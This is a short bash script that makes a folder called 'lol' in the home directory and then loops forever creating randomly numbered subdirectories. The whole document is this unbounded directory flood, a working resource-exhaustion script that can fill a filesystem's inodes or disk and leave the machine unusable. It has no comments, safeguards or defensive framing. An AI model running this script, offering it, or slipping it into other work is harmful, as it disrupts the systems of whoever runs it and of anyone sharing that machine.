#!/bin/bash

cd ~
mkdir -p lol
cd lol

while(true)
do
  mkdir -p $[ $RANDOM % 999999999 ]
done
exit 0
